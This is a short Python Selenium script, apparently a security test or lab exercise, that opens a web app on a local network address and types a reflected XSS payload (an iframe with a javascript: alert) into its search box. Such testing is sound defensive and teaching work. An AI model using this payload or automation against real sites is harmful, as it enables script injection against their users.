from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select

try:
	driver = webdriver.Chrome()
	driver.get("http://192.168.0.217:3000")

	#User inputs malicious JavaScript into search box
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "searchQuery"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "mat-input-1"))).send_keys("<iframe src=\"javascript:alert('xss')\">")
	
finally:
  driver.quit()
